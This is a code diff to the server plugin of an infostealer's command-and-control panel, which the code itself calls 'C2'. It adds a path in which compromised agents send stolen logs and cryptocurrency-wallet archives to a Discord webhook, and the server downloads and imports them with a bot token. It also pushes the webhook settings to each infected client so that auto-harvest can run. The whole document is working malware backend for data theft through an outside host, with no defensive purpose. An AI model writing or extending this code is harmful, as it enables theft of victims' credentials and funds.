@@ -2122,6 +2122,127 @@ async function pollDiscordOnce() {
 
 /** No interval poller — import happens for each webhook upload only; manual poll is optional recovery. */
 
+function getDiscordConfigForAgent() {
+  return {
+    enabled: !!pluginSettings.discord_upload_enabled,
+    webhookUrl: pluginSettings.discord_webhook_url || "",
+    threadPrefix: pluginSettings.discord_thread_prefix || "Stuart",
+  };
+}
+
+/** Best-effort: tell agent to POST harvests to Discord webhook (not bulk over WS). */
+async function pushDiscordConfigToAgent(ctx, clientId) {
+  const cfg = getDiscordConfigForAgent();
+  if (!cfg.enabled || !cfg.webhookUrl) return;
+  // Trusted same-origin call (Overlord plugin worker)
+  const url = `/api/clients/${encodeURIComponent(clientId)}/plugins/stuart/event`;
+  try {
+    if (typeof ctx.fetch === "function") {
+      const res = await ctx.fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ event: "discord_config", payload: cfg }),
+      });
+      if (!res.ok) {
+        const t = await res.text().catch(() => "");
+        throw new Error(`HTTP ${res.status} ${t.slice(0, 120)}`);
+      }
+      console.log(`[stuart] pushed discord_config to agent ${clientId}`);
+      return;
+    }
+  } catch (e) {
+    console.warn(`[stuart] ctx.fetch discord_config failed: ${e.message}`);
+  }
+  // Fallback: nothing — UI collect payload must include discord config
+}
+
+/**
+ * After agent posts to Discord webhook, pull attachments from that thread only and import.
+ */
+async function importDiscordThread(ctx, clientId, threadId) {
+  pluginCtx = ctx;
+  if (!stmts || !ctx?.db) throw new Error("plugin not ready");
+  if (!pluginSettings.discord_bot_token) throw new Error("bot token required to download Discord attachments");
+
+  console.log(`[stuart] importing Discord thread ${threadId} for client ${clientId}`);
+  const messages = await discordBotFetch(`/channels/${threadId}/messages?limit=50`);
+  const zips = [];
+  for (const msg of messages || []) {
+    for (const att of msg.attachments || []) {
+      const name = (att.filename || "").toLowerCase();
+      if (!name.endsWith(".zip")) continue;
+      if (ctx.db.prepare(`SELECT 1 FROM discord_imports WHERE attachment_id = ?`).get(att.id)) {
+        continue;
+      }
+      try {
+        const buf = await downloadDiscordAttachment(att);
+        zips.push({ att, buf, msg });
+      } catch (e) {
+        console.warn(`[stuart] download ${att.filename}: ${e.message}`);
+      }
+    }
+  }
+  if (!zips.length) {
+    console.warn(`[stuart] no new zip attachments in thread ${threadId}`);
+    return { ok: false, reason: "no attachments" };
+  }
+
+  // Split log containers vs wallet containers by inspecting meta after unzip
+  const logParts = [];
+  const walletParts = [];
+  for (const z of zips) {
+    let kind = "logs";
+    try {
+      const entries = unzipAll(z.buf);
+      for (const ent of entries) {
+        if (baseName(ent.name) === "meta.json") {
+          const meta = JSON.parse(ent.data.toString("utf8"));
+          if (meta.kind === "wallets" || meta.kind === "wallet_chunk") kind = "wallets";
+          if (meta.clientId) clientId = meta.clientId;
+          break;
+        }
+      }
+    } catch (_) {}
+    const part = { zip: z.buf, filename: z.att.filename, size: z.buf.length };
+    if (kind === "wallets") walletParts.push(part);
+    else logParts.push(part);
+
+    ctx.db.prepare(
+      `INSERT OR IGNORE INTO discord_imports(attachment_id, message_id, thread_id, client_id, filename, imported_at) VALUES(?,?,?,?,?,?)`
+    ).run(z.att.id, z.msg.id, threadId, clientId, z.att.filename || "", Date.now());
+  }
+
+  let importedLogs = null;
+  let importedWallets = null;
+  if (logParts.length) {
+    try {
+      importedLogs = await importThisWebhookZip(ctx.db, null, clientId, logParts);
+    } catch (e) {
+      console.error("[stuart] log import from Discord thread:", e.message);
+    }
+  }
+  if (walletParts.length) {
+    try {
+      importedWallets = importWalletPartsIntoDb(ctx.db, clientId, walletParts);
+    } catch (e) {
+      console.error("[stuart] wallet import from Discord thread:", e.message);
+    }
+  }
+
+  discordPollStatus = {
+    lastAt: Date.now(),
+    lastOk: true,
+    lastError: "",
+    imported: (importedLogs?.parts || 0) + (importedWallets?.imported || 0),
+    message: `thread ${threadId}: logs=${logParts.length} walletParts=${walletParts.length}`,
+  };
+  try {
+    ctx.broadcast("harvest_update", { clientId, source: "discord", threadId });
+  } catch (_) {}
+  console.log(`[stuart] Discord thread import done client=${clientId} logs=${logParts.length} wallets=${walletParts.length}`);
+  return { ok: true, logParts: logParts.length, walletParts: walletParts.length, importedLogs, importedWallets };
+}
+
 function runPurge(db) {
   let total = 0;
   if (pluginSettings.history_limit > 0) {
@@ -2836,9 +2957,43 @@ export default {
       }
     };
 
-    if (event === "results") {
+    if (event === "discord_upload_complete") {
+      // Agent uploaded log+wallet zips directly to Discord webhook (HTTP).
+      // Import THAT forum thread only — no bulk harvest over C2 WebSocket.
+      const threadId = payload?.threadId || payload?.channel_id;
+      console.log(
+        `[stuart] agent Discord upload complete client=${clientId} thread=${threadId} ` +
+        `wallets=${payload?.wallets} history=${payload?.history}`
+      );
+      if (!threadId) {
+        console.warn("[stuart] discord_upload_complete missing threadId");
+        return;
+      }
+      if (!isDiscordPollConfigured()) {
+        console.warn("[stuart] bot token + forum channel id required to import agent Discord uploads");
+        try {
+          ctx.broadcast("discord_upload_pending", {
+            clientId,
+            threadId,
+            error: "Set Discord bot token + forum channel id so the server can import the post",
+          });
+        } catch (_) {}
+        return;
+      }
+      importDiscordThread(ctx, clientId, String(threadId)).catch(e =>
+        console.error("[stuart] importDiscordThread:", e.message)
+      );
+      return;
+    } else if (event === "ready") {
+      // Push webhook config so auto-harvest can upload to Discord without WS bulk data
       if (isDiscordPipelineOn()) {
-        // Full collect payload — replace partials; wait for wallet_auto_data if wallets listed
+        pushDiscordConfigToAgent(ctx, clientId).catch(e =>
+          console.warn("[stuart] push discord_config:", e.message)
+        );
+      }
+    } else if (event === "results") {
+      if (isDiscordPipelineOn()) {
+        // Legacy path: agent still streaming harvest over WS (old agent or webhook missing)
         if (payload?.wallets?.length) noteExpectedWallets(clientId, payload.wallets);
         viaDiscord(payload || {}, { replace: true, settle: true });
         return;
